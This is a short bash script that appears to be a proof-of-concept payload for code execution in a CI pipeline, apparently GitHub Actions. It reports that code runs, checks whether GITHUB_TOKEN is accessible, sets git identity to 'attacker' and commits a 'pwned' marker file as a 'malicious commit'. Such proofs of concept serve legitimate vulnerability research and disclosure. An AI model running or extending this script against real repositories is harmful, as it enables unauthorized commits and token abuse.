#!/bin/bash

echo "[+] Code execution achieved"

if [ ! -z "$GITHUB_TOKEN" ]; then
    echo "[+] Token accessible"
fi

git config --global user.email "attacker@test.com"
git config --global user.name "attacker"

echo "pwned" >> POC.txt

git add .
git commit -m "malicious commit"
